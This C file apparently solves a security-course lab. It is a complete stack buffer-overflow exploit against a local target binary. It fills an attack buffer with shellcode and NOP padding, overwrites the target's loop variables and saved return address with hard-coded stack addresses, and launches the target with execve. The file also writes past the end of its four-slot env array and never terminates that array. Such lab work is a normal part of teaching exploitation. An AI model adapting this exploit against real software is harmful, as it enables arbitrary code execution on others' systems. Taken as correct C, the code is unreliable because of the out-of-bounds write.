#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target2"


// just some of my notes

// place shellcode in the environmental variables

// the buffer is in foo

// main rip at 0x3021fec8

// foo rip at 0x3021fe98
// the start of buffer is 0x3021fd80
// the top of buffer is 0x3021fe80

// RA is at 256 + 24 = 280 => 280 + 4

// the address of i is 0x3021fe8c -- 256 + 12 = 268
// the address of len is 0x3021fe88 -- 256 + 8 = 264



int
main ( int argc, char * argv[] )
{
	char *	args[3];
	char *	env[4];

	// Initialize shellcode and related variables
	int buffer_size = 280 + 4 + 1;
	int shell_length = strlen(shellcode);
	//printf("%d\n", shell_length);

	char atk_buf[buffer_size];

	// fill shellcode characters
	for(int i = 0; i < shell_length; i++){
		atk_buf[i] = shellcode[i];
	}

	//fill the remaining permitted length with 0x90
	//printf("%d\n", buffer_size);
	for(int i = shell_length; i < buffer_size; i++){
		atk_buf[i] = '\x90';
	}
	//printf("%x\n", atk_buf[buffer_size-1]);
	

	// Change iterator and change len
	atk_buf[264] = '\x1D';
	atk_buf[265] = '\x01';
	atk_buf[266] = '\x00';
	atk_buf[267] = '\x00';

	atk_buf[268] = '\x0C';
	atk_buf[269] = '\x01';
	atk_buf[270] = '\x00';
	atk_buf[271] = '\x00';

	atk_buf[280] = '\x80';
	atk_buf[281] = '\xfd';
	atk_buf[282] = '\x21';
	atk_buf[283] = '\x30';

	atk_buf[284] = '\x00';

	args[0] = TARGET;
	args[1] = atk_buf;
	args[2] = NULL;


	//0x3021fd80;
	//env[0] = &atk_buf[266];
	env[0] = &atk_buf[266];
	env[1] = &atk_buf[268];
	env[2] = &atk_buf[270];
	env[3] = &atk_buf[272];
	env[4] = &atk_buf[284];
	

	if ( execve (TARGET, args, env) < 0 )
		fprintf (stderr, "execve failed.\n");

	return (0);
}
